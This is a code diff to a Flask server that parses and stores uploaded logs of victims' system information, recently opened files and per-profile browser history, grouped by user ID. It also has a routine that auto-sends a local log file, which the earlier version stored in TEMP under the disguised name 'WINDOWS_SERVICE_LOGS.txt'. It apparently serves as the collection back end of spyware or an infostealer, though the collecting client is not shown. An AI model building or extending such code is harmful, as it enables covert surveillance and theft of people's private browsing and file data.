@@ -4,7 +4,6 @@ import glob
 import getpass
 import threading
 import webbrowser
-import tempfile
 import requests
 from flask import Flask, request, jsonify, render_template
 from flask_sqlalchemy import SQLAlchemy
@@ -46,7 +45,7 @@ def parse_log(raw: str) -> dict:
     result = {"system_info": {}, "recent_files": [], "browser_history": [], "browser_profiles": {}}
 
     # SYSTEM INFO
-    si_match = re.search(r"\[SYSTEM INFORMATION\].*?={10,}(.*?)(?=\[|\Z)", raw, re.S)
+    si_match = re.search(r"\[SYSTEM INFORMATION\]\s*\n={10,}\s*\n(.*?)(?=={10,})", raw, re.S)
     if si_match:
         for line in si_match.group(1).splitlines():
             if ":" in line:
@@ -56,7 +55,7 @@ def parse_log(raw: str) -> dict:
                     result["system_info"][k] = v
 
     # RECENTLY ACCESSED FILES
-    rf_match = re.search(r"\[RECENTLY ACCESSED FILES\].*?={10,}(.*?)(?=\[|\Z)", raw, re.S)
+    rf_match = re.search(r"\[RECENTLY ACCESSED FILES\]\s*\n={10,}\s*\n(.*?)(?=={10,})", raw, re.S)
     if rf_match:
         for line in rf_match.group(1).splitlines():
             line = line.strip()
@@ -64,13 +63,13 @@ def parse_log(raw: str) -> dict:
             if fm:
                 result["recent_files"].append({"ext": fm.group(1), "name": fm.group(2).strip()})
 
-    # BROWSER HISTORY — supports both profile sections and plain [BROWSER HISTORY]
+    # BROWSER HISTORY — per profile sections
     all_history = []
     profile_pattern = re.compile(
-        r"\[BROWSER HISTORY(?:\s*-\s*PROFILE:\s*(.+?))?\].*?={10,}(.*?)(?=\[|\Z)", re.S
+        r"\[BROWSER HISTORY - PROFILE:\s*(.+?)\]\s*\n={10,}\s*\n(.*?)(?=={10,}\s*\n|\Z)", re.S
     )
     for pm in profile_pattern.finditer(raw):
-        profile_name = (pm.group(1) or "Default").strip()
+        profile_name = pm.group(1).strip()
         profile_raw  = pm.group(2)
         entries = re.split(r"\n(?=\[\d+\])", profile_raw)
         profile_entries = []
@@ -129,8 +128,10 @@ def get_data():
 
 @app.route("/users", methods=["GET"])
 def list_users():
-    entries = (LogEntry.query.order_by(LogEntry.received_at.desc()).all())
-    return jsonify({"entries": [e.to_dict() for e in entries]})
+    rows = (db.session.query(LogEntry.user_id, db.func.count(LogEntry.id))
+                      .group_by(LogEntry.user_id).all())
+    return jsonify({"users": [{"user_id": r[0], "log_count": r[1]} for r in rows]})
+
 
 @app.route("/parse", methods=["GET"])
 def parse_entry():
@@ -171,11 +172,11 @@ def detect_and_send():
     import time
     time.sleep(1.5)
 
-    temp_dir = os.environ.get("TEMP") or tempfile.gettempdir()
-    log_file = os.path.join(temp_dir, "WINDOWS_SERVICE_LOGS.txt")
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    log_file   = os.path.join(script_dir, "k232003.txt")
 
     if not os.path.isfile(log_file):
-        print(f"[AUTO-SEND] WINDOWS_SERVICE_LOGS.txt not found in {temp_dir} — skipping.")
+        print(f"[AUTO-SEND] k232003.txt not found in {script_dir} — skipping.")
         return
 
     with open(log_file, "r", encoding="utf-8", errors="replace") as f:
